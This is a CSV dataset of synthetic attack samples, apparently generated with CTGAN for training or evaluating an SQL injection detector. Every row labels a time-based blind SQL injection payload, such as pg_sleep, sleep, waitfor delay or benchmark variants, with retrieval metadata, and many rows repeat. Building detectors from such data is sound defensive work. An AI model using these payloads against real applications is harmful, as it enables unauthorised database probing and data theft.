id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_001664,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,6.054001361471039
CTGAN_001665,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,7.199054210277217
CTGAN_001666,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000146,5.582594366479234
CTGAN_001667,attack,time, (  select   (  case when   (  9856  =  9856  )   then sleep  (  5  )   else 9856*  (  select 9856 from information_schema.character_sets  )   end   )    ) ,nearest_attack_euclidean,R000132,10.108564188570158
CTGAN_001668,attack,time,waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf,nearest_attack_euclidean,R000137,5.926848997664982
CTGAN_001669,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,4.750902529350814
CTGAN_001670,attack,time,"waitfor delay '0:0:5' and   (  ""ludp"" like ""ludp",nearest_attack_euclidean,R000099,5.2259671750958265
CTGAN_001671,attack,time,1'  )   as inid where 7812  =  7812 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000136,5.934160449148796
CTGAN_001672,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000093,8.06508667401825
CTGAN_001673,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,5.120246312335931
CTGAN_001674,attack,time,"1"" where 7739  =  7739 and sleep  (  5  )  --",nearest_attack_euclidean,R000069,6.1441256837747105
CTGAN_001675,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,5.849029304342778
CTGAN_001676,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000093,6.267499844998935
CTGAN_001677,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,7.885347645277866
CTGAN_001678,attack,time,select pg_sleep  (  5  )  -- ojzt,nearest_attack_euclidean,R000139,6.192585964256424
CTGAN_001679,attack,time,1   )    )    or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000033,4.338488929479047
CTGAN_001680,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,7.16798365383371
CTGAN_001681,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,4.645628291608712
CTGAN_001682,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,5.627605810927127
CTGAN_001683,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,5.243016762002195
CTGAN_001684,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,7.108059416731458
CTGAN_001685,attack,time,"1"" where 7739  =  7739 and sleep  (  5  )  --",nearest_attack_euclidean,R000069,6.163681179540211
CTGAN_001686,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,6.314868169072169
CTGAN_001687,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,8.804655508227134
CTGAN_001688,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,5.302424131092999
CTGAN_001689,attack,time,1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like 'uzhd,nearest_attack_euclidean,R000112,5.909158026574445
CTGAN_001690,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,5.635741521373034
CTGAN_001691,attack,time,1  )   as cwsi where 7360  =  7360 or sleep  (  5  )  #,nearest_attack_euclidean,R000124,6.574471769306602
CTGAN_001692,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000084,6.241420666800911
CTGAN_001693,attack,time,1  )   as hlcn where 1165  =  1165 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000153,7.451047787467415
CTGAN_001694,attack,time,"1'+  (  select 'iyvn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",nearest_attack_euclidean,R000083,8.882516982126573
CTGAN_001695,attack,time,"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000038,5.903051283078237
CTGAN_001696,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,7.351564237676632
CTGAN_001697,attack,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",nearest_attack_euclidean,R000100,7.029931941396289
CTGAN_001698,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,4.415013542746533
CTGAN_001699,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,7.333942320448351
CTGAN_001700,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,4.716051495530998
CTGAN_001701,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,5.013043601009599
CTGAN_001702,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'nbzf' like 'nbzf,nearest_attack_euclidean,R000097,6.799910581688317
CTGAN_001703,attack,time,"1'   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000109,10.033361055383184
CTGAN_001704,attack,time,"1"" rlike sleep  (  5  )   and ""veub""  =  ""veub",nearest_attack_euclidean,R000143,7.042495989989411
CTGAN_001705,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000134,6.071018894964254
CTGAN_001706,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,7.5775505837527275
CTGAN_001707,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000114,6.615904421772542
CTGAN_001708,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000114,7.516470982080486
CTGAN_001709,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,6.126308721741351
CTGAN_001710,attack,time,"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000073,7.324162216903683
CTGAN_001711,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,6.891616590826681
CTGAN_001712,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,4.792787062140105
CTGAN_001713,attack,time,1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like 'uzhd,nearest_attack_euclidean,R000112,6.76322724707717
CTGAN_001714,attack,time,"1   )    )    as cusv where 4871  =  4871 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000123,7.483566581996299
CTGAN_001715,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000114,5.4975665440627335
CTGAN_001716,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,4.855601340619651
CTGAN_001717,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,4.503322655032716
CTGAN_001718,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,5.838938239952431
CTGAN_001719,attack,time,"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy",nearest_attack_euclidean,R000091,6.575071942224002
CTGAN_001720,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,6.015603154141168
CTGAN_001721,attack,time,"1%""  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000090,10.811079474487826
CTGAN_001722,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,6.712782778169795
CTGAN_001723,attack,time,"1""   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000056,4.958442901211142
CTGAN_001724,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000093,6.712194394210891
CTGAN_001725,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,6.09837871383547
CTGAN_001726,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,5.698705745596748
CTGAN_001727,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000035,6.298565849382764
CTGAN_001728,attack,time,1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #,nearest_attack_euclidean,R000074,5.862134467955772
CTGAN_001729,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,7.9866646460908886
CTGAN_001730,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,7.255162595997886
CTGAN_001731,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,4.41307984216373
CTGAN_001732,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,7.729455470651189
CTGAN_001733,attack,time,1  )   as cwsi where 7360  =  7360 or sleep  (  5  )  #,nearest_attack_euclidean,R000124,6.6668737356426435
CTGAN_001734,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000084,8.040825043420721
CTGAN_001735,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,4.778633558478682
CTGAN_001736,attack,time,waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf,nearest_attack_euclidean,R000137,8.41929893791818
CTGAN_001737,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,7.182958025481144
CTGAN_001738,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,9.014404324855464
CTGAN_001739,attack,time,1   )    )    or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000033,6.153394359674465
CTGAN_001740,attack,time,1'  )   where 7908  =  7908 or sleep  (  5  )  --,nearest_attack_euclidean,R000103,7.493626600634469
CTGAN_001741,attack,time,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  -- ybmz,nearest_attack_euclidean,R000150,7.820278997438495
CTGAN_001742,attack,time,"1'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000126,7.871617408586131
CTGAN_001743,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,5.96229883289029
CTGAN_001744,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,6.695830258261134
CTGAN_001745,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,5.268504963480354
CTGAN_001746,attack,time,1   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000111,5.866679727554727
CTGAN_001747,attack,time,"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy",nearest_attack_euclidean,R000091,8.128283177224702
CTGAN_001748,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000079,7.126779486505899
CTGAN_001749,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,7.135445170542043
CTGAN_001750,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000084,5.902336331517805
CTGAN_001751,attack,time,""" or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000040,5.720126577464167
CTGAN_001752,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,5.6227122713304505
CTGAN_001753,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,5.439073947988481
CTGAN_001754,attack,time,"1'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000126,6.276337813267261
CTGAN_001755,attack,time,1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'prjf'  =  'prjf,nearest_attack_euclidean,R000133,7.652111607637299
CTGAN_001756,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,4.176309875330052
CTGAN_001757,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,7.144294924550624
CTGAN_001758,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000093,5.021278340603663
CTGAN_001759,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,7.685783244438908
CTGAN_001760,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R000096,7.149207224360692
CTGAN_001761,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,4.782723377385291
CTGAN_001762,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,6.216288778031132
CTGAN_001763,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,5.96727439738339
CTGAN_001764,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000110,7.131522353978598
CTGAN_001765,attack,time, (  select   (  case when   (  9856  =  9856  )   then sleep  (  5  )   else 9856*  (  select 9856 from information_schema.character_sets  )   end   )    ) ,nearest_attack_euclidean,R000132,8.060847640763793
CTGAN_001766,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,5.475452175400914
CTGAN_001767,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000114,8.172973740569907
CTGAN_001768,attack,time,"1'+  (  select 'iyvn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",nearest_attack_euclidean,R000083,7.989276871509469
CTGAN_001769,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000042,7.729949519423948
CTGAN_001770,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,8.145202969747656
CTGAN_001771,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,nearest_attack_euclidean,R000086,6.5739479798111295
CTGAN_001772,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,11.03931021764196
CTGAN_001773,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000134,5.987704636862374
CTGAN_001774,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000084,6.837405386214554
CTGAN_001775,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,7.281591756596622
CTGAN_001776,attack,time,"1""  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000075,8.17799354468616
CTGAN_001777,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,6.769815719103208
CTGAN_001778,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,8.988141375160454
CTGAN_001779,attack,time,"1""  )   where 7165  =  7165 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000118,8.702376044932365
CTGAN_001780,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,6.868928204188168
CTGAN_001781,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,6.743373342936284
CTGAN_001782,attack,time,"1'+  (  select 'iyvn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",nearest_attack_euclidean,R000083,7.053222414361175
CTGAN_001783,attack,time,1'+  (  select mavu where 4276  =  4276 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000115,7.032709275069274
CTGAN_001784,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,12.644363795559814
CTGAN_001785,attack,time,1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'prjf'  =  'prjf,nearest_attack_euclidean,R000133,6.002917084022997
CTGAN_001786,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,6.961880407711006
CTGAN_001787,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,8.137030453858033
CTGAN_001788,attack,time,"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000038,6.398000717594458
CTGAN_001789,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,5.437504544244338
CTGAN_001790,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,6.343320252839385
CTGAN_001791,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,4.836957232691347
CTGAN_001792,attack,time,1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'prjf'  =  'prjf,nearest_attack_euclidean,R000133,7.283168014883277
CTGAN_001793,attack,time,"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000038,7.781123202344856
CTGAN_001794,attack,time,"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy",nearest_attack_euclidean,R000091,5.875374241465107
CTGAN_001795,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000034,10.522193409713815
CTGAN_001796,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,6.606190543776838
CTGAN_001797,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,5.699706805065407
CTGAN_001798,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000034,10.683261498984482
CTGAN_001799,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,7.713502091435097
CTGAN_001800,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,4.790959614354828
CTGAN_001801,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,6.6843766224646135
CTGAN_001802,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000093,6.603166961934404
CTGAN_001803,attack,time,"1   )    )    as cusv where 4871  =  4871 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000123,9.451862768922027
CTGAN_001804,attack,time,1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000105,6.868849686176872
CTGAN_001805,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,7.272786573773173
CTGAN_001806,attack,time,"1"" rlike sleep  (  5  )   and ""veub""  =  ""veub",nearest_attack_euclidean,R000143,5.3729432490522795
CTGAN_001807,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,6.2628000806291935
CTGAN_001808,attack,time,waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf,nearest_attack_euclidean,R000137,5.888630429045246
CTGAN_001809,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,5.322379978446999
CTGAN_001810,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000134,5.875392138391893
CTGAN_001811,attack,time,1  )   as cwsi where 7360  =  7360 or sleep  (  5  )  #,nearest_attack_euclidean,R000124,6.521884988898013
CTGAN_001812,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,5.835285608134304
CTGAN_001813,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000047,6.442640579204021
CTGAN_001814,attack,time,1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000105,6.96437614753517
CTGAN_001815,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond",nearest_attack_euclidean,R000119,5.906294980757318
CTGAN_001816,attack,time,1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,nearest_attack_euclidean,R000089,5.454950099849845
CTGAN_001817,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,4.966273719204429
CTGAN_001818,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,6.832014028017939
CTGAN_001819,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,nearest_attack_euclidean,R000086,6.267971309076705
CTGAN_001820,attack,time,1'  )   where 7908  =  7908 or sleep  (  5  )  --,nearest_attack_euclidean,R000103,5.253626122179962
CTGAN_001821,attack,time,""" or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000040,6.352456798396623
CTGAN_001822,attack,time,1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,nearest_attack_euclidean,R000089,6.366864177324059
CTGAN_001823,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  -- paxv,nearest_attack_euclidean,R000094,8.784344147219283
CTGAN_001824,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000034,10.552720901068279
CTGAN_001825,attack,time,"1'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000126,7.028886447420173
CTGAN_001826,attack,time,1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000105,5.804755162682544
CTGAN_001827,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,8.633935985338248
CTGAN_001828,attack,time,1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,nearest_attack_euclidean,R000089,5.146234685491903
CTGAN_001829,attack,time,"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy",nearest_attack_euclidean,R000091,8.78341810222863
CTGAN_001830,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,8.167484666245299
CTGAN_001831,attack,time,"1%""  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000090,6.055912220827057
CTGAN_001832,attack,time,"1   )    )    as cusv where 4871  =  4871 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000123,6.582678810298827
CTGAN_001833,attack,time,"1'+  (  select 'iyvn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",nearest_attack_euclidean,R000083,9.060134248882036
CTGAN_001834,attack,time,select pg_sleep  (  5  )  -- ojzt,nearest_attack_euclidean,R000139,5.619401141411348
CTGAN_001835,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,5.402859266799894
CTGAN_001836,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,6.711231624353226
CTGAN_001837,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,7.451179363841746
CTGAN_001838,attack,time,1'  )   where 7908  =  7908 or sleep  (  5  )  --,nearest_attack_euclidean,R000103,5.196588751943589
CTGAN_001839,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,5.701357024045237
CTGAN_001840,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R000096,7.317739217445016
CTGAN_001841,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,4.685977279323501
CTGAN_001842,attack,time,1'  )   where 7908  =  7908 or sleep  (  5  )  --,nearest_attack_euclidean,R000103,6.338512611305405
CTGAN_001843,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,4.625663902028207
CTGAN_001844,attack,time,"1'+  (  select 'iyvn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",nearest_attack_euclidean,R000083,8.649342677295538
CTGAN_001845,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000138,7.270138763312179
CTGAN_001846,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""vjlr"" like ""vjlr",nearest_attack_euclidean,R000145,6.627234232382354
CTGAN_001847,attack,time,"waitfor delay '0:0:5' and   (  ""ludp"" like ""ludp",nearest_attack_euclidean,R000099,6.441650019219292
CTGAN_001848,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  -- paxv,nearest_attack_euclidean,R000094,9.261895076487258
